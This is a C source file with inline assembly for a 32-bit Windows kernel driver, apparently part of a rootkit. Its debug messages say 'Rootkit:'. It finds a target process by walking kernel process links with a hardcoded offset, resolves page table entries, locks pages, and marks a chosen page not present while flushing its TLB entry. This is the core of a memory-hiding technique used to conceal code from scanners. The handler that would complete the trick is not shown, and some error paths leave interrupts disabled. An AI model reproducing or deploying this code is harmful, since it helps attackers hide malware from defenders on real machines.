#include "Process.h"

PEPROCESS FindEprocessByName(PUCHAR MyName)
{
	PEPROCESS CurrentProcess = PsGetCurrentProcess();
	PEPROCESS MyProcess = CurrentProcess;

	do 
	{	
		if( strstr( (const char *)&MyProcess->ImageFileName , (const char *)MyName) ) return MyProcess;

		MyProcess = (PEPROCESS)((ULONG)(MyProcess->ActiveProcessLinks).Flink - 0x88);

	} while(MyProcess != CurrentProcess);

	return NULL;

}

PVOID FindRetInPage( PVOID VirtualAddress )
{
	PUCHAR Ret = (PUCHAR)VirtualAddress;

	while( *Ret != 0xC3 ) Ret++;

	return Ret;
}


ULONG* GetPteAddress( PVOID VirtualAddress )                                 
{     
	ULONG* pPTE = 0;
	__asm                                                 
	{                                                                  
		cli                                
		pushad

		mov esi, PROCESS_PAGE_DIR_BASE

		mov edx, VirtualAddress                                    
		mov eax, edx                                               
		shr eax, 22
		lea eax, [esi + eax*4]

		test [eax], 0x80          
		jnz Is_Large_Page       

		mov esi, PROCESS_PAGE_TABLE_BASE                           
		shr edx, 12                                                
		lea eax, [esi + edx*4]
		mov pPTE, eax                                              
		jmp Done                                                   

Is_Large_Page:                                             
		mov pPTE, LARGE_MEMORYPAGE                                              

Done:                                                      
		popad                                                      
		sti               
	}                                                       

	return pPTE;                                                       

} 

VOID MarkPagePresent( ULONG* pPte )
{
	__asm
	{
		mov eax, pPte
		or dword ptr [eax], 0x01
	}
}

VOID MarkPageNotPresent( ULONG* pPte )
{	
	__asm
	{
		mov eax, pPte
		and dword ptr [eax], 0xFFFFFFFE
	}
}

ULONG SetProtectedPage( PUCHAR NameProcess, PVOID ProtectedPage, PVOID PageReadWrite, PVOID PageExecute)
{
	ULONG* Temp;

	pProtectedPage = ProtectedPage;
	
	MyProcess = FindEprocessByName(NameProcess);

	if( MyProcess == NULL ) return PROCESS_NOT_FOUND;

	KeAttachProcess(MyProcess);

	__asm cli

	pPteProtectedPage = GetPteAddress( ProtectedPage );
	if( pPteProtectedPage == 	(ULONG*)LARGE_MEMORYPAGE ) return LARGE_MEMORYPAGE;
	DbgPrint("PTE Protected Page : %x\n", *pPteProtectedPage);

	Temp = GetPteAddress( PageReadWrite );
	if( Temp == (ULONG*)LARGE_MEMORYPAGE ) return LARGE_MEMORYPAGE;
	PtePageReadWrite = *Temp;
	DbgPrint("PTE Page Read/Write : %x\n", PtePageReadWrite);


	Temp = GetPteAddress( PageExecute );
	if( Temp == (ULONG*)LARGE_MEMORYPAGE ) return LARGE_MEMORYPAGE;
	PtePageExecute = *Temp;
	DbgPrint("PTE Page Execute : %x\n", PtePageExecute);

	pMDLProtectedPage = IoAllocateMdl(ProtectedPage, 2048, FALSE, FALSE, NULL);

	__try
	{
		MmProbeAndLockPages(pMDLProtectedPage, UserMode, IoReadAccess); 
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		DbgPrint("Rootkit: MmProbe.. Failed on ProtectedPage : 0x%x\n", GetExceptionCode());
		return OTHER_ERROR;
	}

	pMDLPageReadWrite = IoAllocateMdl(PageReadWrite, 2048, FALSE, FALSE, NULL);

	__try
	{
		MmProbeAndLockPages(pMDLPageReadWrite, UserMode, IoReadAccess); 
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		DbgPrint("Rootkit: MmProbe.. Failed on PageReadWrite : 0x%x\n", GetExceptionCode());
		return OTHER_ERROR;
	}

	pMDLPageExecute = IoAllocateMdl(PageExecute, 2048, FALSE, FALSE, NULL);

	__try
	{
		MmProbeAndLockPages(pMDLPageExecute, UserMode, IoReadAccess); 
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		DbgPrint("Rootkit: MmProbe.. Failed on PageExecute : 0x%x\n", GetExceptionCode());
		return OTHER_ERROR;
	}

	__asm
	{
		mov eax, cr3
		mov Cr3Process, eax
	}
	DbgPrint("Process Cr3 : %x\n", Cr3Process);

	pRetInProtectedPage = FindRetInPage( ProtectedPage );

	DbgPrint("Ret Into Protected Page : %x\n", pRetInProtectedPage);

	MarkPageNotPresent( pPteProtectedPage );

	DbgPrint("PTE marqué non present\n");

	__asm
	{
		invlpg ProtectedPage
		sti
	}

	DbgPrint("Entrée TLB supprimée !\n");

	DbgPrint("PTE Protected Page : %x\n", *pPteProtectedPage);

	KeDetachProcess();

	__asm sti

	return GOOD_MEMORYPAGE;
}

VOID UnSetProtectedPage()
{

	KeAttachProcess(MyProcess);

	if(pMDLProtectedPage) MmUnlockPages(pMDLProtectedPage);
	if(pMDLPageExecute) MmUnlockPages(pMDLPageExecute);
	if(pMDLPageReadWrite) MmUnlockPages(pMDLPageReadWrite);

	MarkPagePresent(pPteProtectedPage);

	KeDetachProcess();

}

